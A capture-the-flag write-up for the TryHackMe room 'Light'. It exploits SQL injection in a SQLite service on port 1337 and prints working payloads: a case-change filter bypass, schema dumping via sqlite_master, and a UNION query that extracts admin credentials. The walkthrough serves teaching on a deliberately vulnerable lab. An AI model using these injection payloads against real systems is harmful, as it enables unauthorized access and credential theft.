---
title: "TryHackMe: Light"
categories: [TryHackMe]
tags: [sql injection]
render_with_liquid: false
media_subpath: /images/tryhackme_light/
image:
  path: banner.png
---

Light is a beginner friendly room where we exploit an SQL injection in a SQLite database to retrieve admin credentials and capture the flag.

Welcome to the Light database application!

I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using nc <MACHINE_IP> 1337
You can use the username smokey in order to get started.

![](room_card.png){: width="300" height="300" .shadow}
_<https://tryhackme.com/r/room/lightroom>_

## Connecting to the Service

The room runs a database service on port `1337`. Start by connecting using `nc`:

```console
$ rlwrap nc 10.12.156.13 1337
Welcome to the Light database!
Please enter your username:
```

The room instructs us to use the username `smokey` initially:

```console
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

## Discovering SQL Injection

Attempting a simple SQL injection with `'` reveals an error:

```console
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```

A union-based attempt fails due to input filters:

```console
Please enter your username: ' UNION SELECT 1-- -
For strange reasons I can't explain, any input containing /*, -- or %0b is not allowed :)
```

By adjusting the payload and bypassing filters via capitalization, we can successfully perform a union-based injection:

```console
Please enter your username: ' Union Select 1 '
Password: 1
```

## Identifying the Database

Using `UNION SELECT` queries, we determine the DBMS is SQLite:

```console
Please enter your username: ' Union Select sqlite_version() '
Password: 3.31.1
```

## Dumping the Database Structure

Extract the database schema:

```console
Please enter your username: ' Union Select group_concat(sql) FROM sqlite_master '
Password: CREATE TABLE usertable (
           id INTEGER PRIMARY KEY,
           username TEXT,
           password INTEGER),
         CREATE TABLE admintable (
           id INTEGER PRIMARY KEY,
           username TEXT,
           password INTEGER)
```
## Extracting Admin Credentials

Retrieve admin credentials and the flag:

```console
Please enter your username: ' Union Select group_concat(username || ":" || password) FROM admintable '
Password: [REDACTED]}
```

[Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-string-methodology)